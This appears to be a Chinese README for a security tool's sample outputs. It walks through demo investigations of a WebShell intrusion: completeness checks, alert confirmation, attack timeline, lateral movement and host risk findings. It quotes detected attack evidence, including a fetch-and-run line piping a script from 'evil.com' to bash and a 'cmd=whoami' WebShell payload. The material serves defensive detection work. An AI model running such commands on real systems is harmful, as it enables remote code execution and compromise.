# SecWeaver 样例输出报告

**语言：** [English README](README.md) | 简体中文（本文）

> 本目录存放 SecWeaver 开源体验用的样例输出。  
> 这些结果由 `python3 src/secweaver.py demo ...` 基于 `examples/` 下的离线输入生成，用于展示 SecWeaver 的结构化研判结果、证据链、关联边和数据缺口。

---

阅读说明：英文索引提供简要入口，本文提供较详细的结果解读。`demo-*.zh-CN.md` 与 `investigation-report.zh-CN.md` 是当前报告模板的生成结果，部分标题和字段名保留英文；文件后缀不表示已做完整人工翻译。请修改生成模板后重新生成，避免仅手改报告导致再次覆盖。

## 一、如何重新生成这些输出

在仓库根目录执行：

```bash
source .venv/bin/activate
python3 src/secweaver.py demo all
```

如果希望输出到其他目录：

```bash
python3 src/secweaver.py demo all -o /tmp/secweaver-reports
```

生成文件：

| 文件 | 来源 demo | 说明 |
|---|---|---|
| [`demo-completeness-output.json`](demo-completeness-output.json) | `completeness` | 数据源完整性预检输出 |
| [`demo-alert-output.json`](demo-alert-output.json) | `alert` | WAF / WEB 告警确认输出 |
| [`demo-traceability-output.json`](demo-traceability-output.json) | `traceability` | 攻击链溯源输出 |
| [`demo-risk-output.json`](demo-risk-output.json) | `risk` | 主机行为风险识别输出 |

### 一键生成 Markdown 调查报告

```bash
# 从现有 JSON 生成全部 Markdown，并汇总调查链路报告
python3 src/secweaver.py report markdown --demo all --bundle

# 或：先跑 demo，再生成报告
make reports
```

生成文件：

| 文件 | 说明 |
|---|---|
| [`demo-completeness-output.md`](demo-completeness-output.md) | 完整性预检 Markdown 报告 |
| [`demo-alert-output.md`](demo-alert-output.md) | 告警确认 Markdown 报告 |
| [`demo-traceability-output.md`](demo-traceability-output.md) | 溯源分析 Markdown 报告 |
| [`demo-risk-output.md`](demo-risk-output.md) | 风险识别 Markdown 报告 |
| [`investigation-report.md`](investigation-report.md) | 四段链路汇总调查报告 |

也可以把任意 Skill JSON 转成 Markdown：

```bash
python3 src/secweaver.py report markdown \
  -i examples/reports/demo-alert-output.json \
  -o /tmp/alert-report.md
```

---

## 二、样例链路总览

这组样例覆盖了一条典型安全运营链路：

```text
数据源完整性预检
        ↓
告警确认：确认 WebShell 攻击成功
        ↓
溯源分析：还原入口、执行、横向移动和影响范围
        ↓
风险识别：识别对外监听进程高危命令与 C2 外联
```

核心价值是展示 SecWeaver 的输出不是一句自然语言结论，而是包含：

- 判断结论。
- 置信度。
- 使用了哪些证据。
- 哪些证据被关联起来。
- 哪些数据还缺失。
- 下一步建议执行什么 Skill 或处置动作。

---

## 三、数据源完整性预检样例

输出文件：[`demo-completeness-output.json`](demo-completeness-output.json)

### 3.1 输入场景

| 字段 | 值 |
|---|---|
| 场景 | S1 外网攻击 IP 溯源 |
| 攻击 IP | `203.0.113.10` |
| 时间范围 | `2026-06-21T08:00:00+08:00` 到 `2026-06-21T20:00:00+08:00` |
| 相关主机 | `web-01` |

### 3.2 关键结论

| 字段 | 输出 |
|---|---|
| `overall_verdict` | `full_traceable` |
| `confidence` | `1.0` |
| `can_trace` | `true` |
| `can_confirm_breach` | `true` |
| `summary` | 数据源满足当前调查场景，可启动下游溯源或确认 Skill。 |

### 3.3 已满足的数据源要求

| 优先级 | 要求 | 状态 | 资产 |
|---|---|---|---|
| P0 | WEB/WAF 日志 | ready | `asset-waf-prod-01` |
| P0 | WEB 服务器进程命令执行 | ready | `asset-secweaver-host-exec` |
| P0 | SSH 认证日志 | ready | `asset-ssh-internal` |
| P1 | WEB 服务器主动外连 | ready | `asset-secweaver-host-connect` |
| P1 | 防火墙/全流量内网连接 | ready | `asset-fw-dmz-internal` |
| P1 | DNS 查询日志 | ready | `asset-dns-internal` |
| P2 | WEB 服务器文件操作 | ready | `asset-secweaver-host-file-op` |
| P2 | 资产清单 | ready | `asset-cmdb-hosts` |

### 3.4 运营解读

该结果说明当前样例数据源已经足够支撑外部 IP 溯源。此时可以继续执行：

- `alert-confirmation`：确认告警是否真实、是否打穿。
- `traceability-analysis`：获取实际事件并尝试关联攻击路径；首次攻破点和未匹配的 Join 仍须如实标明。

---

## 四、告警确认样例

输出文件：[`demo-alert-output.json`](demo-alert-output.json)

### 4.1 输入场景

| 字段 | 值 |
|---|---|
| 场景 | S4 WEB / WAF 告警确认 |
| 告警 ID | `WAF-20260621-002` |
| 攻击类型 | WebShell |
| 载荷片段 | `cmd=whoami` |

### 4.2 关键结论

| 字段 | 输出 |
|---|---|
| `alert_verdict` | `confirmed_attack` |
| `attack_type` | `webshell` |
| `attack_outcome` | `success_confirmed` |
| `attack_success` | `true` |
| `confidence` | `0.88` |
| `recommended_action` | `escalate_investigate` |
| `next_skill` | `traceability_analysis` |

### 4.3 证据摘要

| 证据类别 | 证据引用 |
|---|---|
| 告警证据 | `WAF-20260621-002` |
| 支撑证据 | `exec-101`, `connect-101`, `file-101`, `web-101` |
| 攻击成功证据 | `exec-101`, `connect-101`, `file-101` |
| 误报迹象 | 无 |

### 4.4 证据关联边

| Join ID | 左证据 | 右证据 | 关联键 | 置信度 |
|---|---|---|---|---|
| `d2_exec_connect_same_listener` | `exec-101` | `connect-101` | `host=web-01`, `listener_port=443` | `0.9` |
| `d2_exec_file_same_host` | `exec-101` | `file-101` | `host=web-01` | `0.85` |

### 4.5 运营解读

该样例不是简单判定“命中 WebShell 规则”，而是继续关联主机执行、外联和文件操作证据。由于存在攻击成功证据，因此建议升级调查并进入溯源分析。

---

## 五、溯源分析样例

输出文件：[`demo-traceability-output.json`](demo-traceability-output.json)

### 5.1 输入场景

| 字段 | 值 |
|---|---|
| 场景 | S1 / S2 / S3 综合溯源 |
| 攻击 IP | `203.0.113.55` |
| 初始受害主机 | `web-01` |
| 横向目标 | `db-01`, `app-02` |

### 5.2 关键结论

| 字段 | 输出 |
|---|---|
| `overall_verdict` | `confirmed_intrusion_chain` |
| `confidence` | `0.88` |
| `blocked` | `false` |
| `initial_access.host` | `web-01` |
| `initial_access.vector` | `webshell` |
| `initial_access.url` | `/api/upload.php` |

摘要：

```text
攻击者 203.0.113.55 于 2026-06-22T09:07:55 命中 web-01；
在 web-01 上发现 4 条执行/下载行为；
横向至 db-01, app-02。
```

### 5.3 攻击时间线

| 时间 | 阶段 | 主机 | 描述 | 证据 |
|---|---|---|---|---|
| `2026-06-22T09:07:55+08:00` | initial_access | `web-01` | 外网访问 `/api/upload.php`，疑似 WebShell 入口 | `web-001` |
| `2026-06-22T09:10:15+08:00` | execution | `web-01` | 执行 `sh -c whoami` | `exec-001`, `file-001`, `file-002` |
| `2026-06-22T09:12:32+08:00` | execution | `web-01` | 下载 `/tmp/sshscan` | `exec-002`, `connect-001`, `file-001`, `file-002` |
| `2026-06-22T09:13:05+08:00` | execution | `web-01` | 执行 `chmod +x /tmp/sshscan` 并主动外联 | `exec-003`, `connect-001`, `file-001`, `file-002` |
| `2026-06-22T09:14:20+08:00` | execution | `web-01` | 扫描 `10.0.2.0/24` 的 SSH 端口 | `exec-004`, `connect-001`, `file-001`, `file-002` |
| `2026-06-22T09:19:15+08:00` | lateral_movement | `db-01` | `web-01` 到 `db-01` 的 SSH 登录成功 | `ssh-002`, `fw-001` |
| `2026-06-22T09:22:40+08:00` | lateral_movement | `app-02` | `web-01` 到 `app-02` 的 SSH 登录成功 | `ssh-003`, `fw-002` |

### 5.4 横向移动图

```text
203.0.113.55
      │ HTTPS / WebShell
      ▼
   web-01
   ├── SSH ──▶ db-01
   └── SSH ──▶ app-02
```

### 5.5 影响范围

| 主机 | 角色 | 优先级 |
|---|---|---|
| `web-01` | 初始失陷主机 | P0 |
| `db-01` | 横向移动目标 | P0 |
| `app-02` | 横向移动目标 | P0 |

### 5.6 建议动作

- 立即隔离初始受害主机：`web-01`。
- 排查并隔离横向目标：`db-01`, `app-02`。
- 保全 WEB、SSH、防火墙和主机行为日志。
- 重置横向涉及账号密码，检查 SSH 密钥。

---

## 六、风险识别样例

输出文件：[`demo-risk-output.json`](demo-risk-output.json)

### 6.1 输入场景

| 字段 | 值 |
|---|---|
| 场景 | S5 对外监听进程风险识别 |
| 主机 | `web-01` |
| 监听端口 | `443`, `80`, `8080` |
| 严重性下限 | `P2` |

### 6.2 关键结论

| 字段 | 输出 |
|---|---|
| `overall_verdict` | `high_risk_detected` |
| `coverage_level` | `partial` |
| 扫描事件数 | `2` |
| 风险项 | `2` |
| P0 风险 | `2` |
| 攻击链数量 | `1` |
| 需要告警 | `2` |

### 6.3 风险项摘要

| 风险模块 | 严重性 | 主机 | 监听进程 | 描述 | 证据 |
|---|---|---|---|---|---|
| exec | P0 | `web-01` | `443/nginx` | 子进程下载并执行远程内容：`curl http://evil.com/a.sh \| bash` | `exec-001` |
| connect | P0 | `web-01` | `443/nginx` | 对外监听进程主动外连公网 `203.0.113.99:443` | `connect-001` |

### 6.4 攻击链摘要

| 字段 | 值 |
|---|---|
| `attack_chain_id` | `chain-web-01-1` |
| `chain_severity` | `P0` |
| `chain_confidence` | `0.95` |
| 攻击阶段 | `execution`, `command_and_control` |
| 风险引用 | `risk-46be2281a8`, `risk-3e404002b2` |

### 6.5 数据缺口

| 缺口 | 影响 |
|---|---|
| `host_file_op: missing` | exec 上下文加权能力下降，WebShell 落地如果未体现在 command 中可能漏检 |

### 6.6 运营解读

该样例表明：对外监听端口的 Web 进程执行 shell 下载并运行远程内容，同时存在主动外联。两个事件被聚合为同一条 P0 攻击链，建议立即隔离主机并启动溯源分析。

---

## 七、报告输出字段速查

| 字段 | 含义 | 适用输出 |
|---|---|---|
| `overall_verdict` / `alert_verdict` | 总体判断 | 完整性、告警、溯源、风险 |
| `confidence` | 置信度 | 告警、溯源、风险 |
| `evidence` / `evidence_refs` | 支撑结论的证据引用 | 告警、溯源、风险 |
| `join_edges` | 证据之间的关联边 | 告警、溯源 |
| `data_gaps` | 数据缺口 | 完整性、溯源、风险 |
| `next_skill` | 推荐下一步 Skill | 告警确认 |
| `recommended_action` / `recommended_actions` | 处置建议 | 告警、溯源、风险 |
| `attack_chain` | 攻击阶段链路 | 溯源 |
| `risk_items` | 风险明细 | 风险识别 |

---

## 八、如何解读这些样例

看 SecWeaver 的样例输出时，建议按这个顺序阅读：

```text
1. 先看 verdict / overall_verdict：结论是什么。
2. 再看 confidence：结论有多可信。
3. 再看 evidence / evidence_refs：用了哪些证据。
4. 再看 join_edges：证据之间如何关联。
5. 再看 data_gaps：哪些结论还不能完全确认。
6. 最后看 recommended_action / next_skill：下一步怎么做。
```

这也是 SecWeaver 与普通 AI Chat 的区别：它要求每个结论都能回到证据、关联和数据缺口上。
